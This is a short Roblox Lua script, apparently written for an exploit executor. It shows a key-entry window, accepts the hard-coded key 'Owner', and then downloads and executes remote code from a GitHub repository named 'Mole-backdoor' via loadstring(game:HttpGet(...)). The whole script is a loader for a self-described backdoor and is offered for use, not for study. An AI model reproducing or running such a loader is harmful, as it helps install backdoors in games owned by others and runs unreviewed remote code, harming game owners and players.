local whitelisted = {
    Ughuhh09 = {
        Key = "Owner"
    }
}

local gui = Instance.new("ScreenGui")
gui.Name = "KeyUI"
gui.ResetOnSpawn = false
gui.Parent = game:GetService("CoreGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 160)
frame.Position = UDim2.new(0.5, -150, 0.5, -80)
frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.Parent = gui

Instance.new("UICorner", frame)

local box = Instance.new("TextBox")
box.PlaceholderText = "Enter key"
box.Text = ""
box.Size = UDim2.new(0.9, 0, 0, 40)
box.Position = UDim2.new(0.05, 0, 0.2, 0)
box.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
box.TextColor3 = Color3.fromRGB(0, 0, 0)
box.TextScaled = true
box.ClearTextOnFocus = false
box.Parent = frame

local btn = Instance.new("TextButton")
btn.Text = "Submit"
btn.Size = UDim2.new(0.9, 0, 0, 40)
btn.Position = UDim2.new(0.05, 0, 0.65, 0)
btn.BackgroundColor3 = Color3.fromRGB(0, 170, 127)
btn.TextScaled = true
btn.TextColor3 = Color3.fromRGB(255, 255, 255)
btn.Parent = frame

btn.MouseButton1Click:Connect(function()
    local input = box.Text
    local isValid = false

    for _, userEntry in pairs(whitelisted) do
        if input == userEntry.Key then
            isValid = true
            break
        end
    end

    if isValid then
        gui:Destroy()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/TheTombstoneBackdoorOwner/Mole-backdoor/refs/heads/main/Mole.lua"))()
    else
        box.Text = ""
        box.PlaceholderText = "Invalid key"
    end
end)
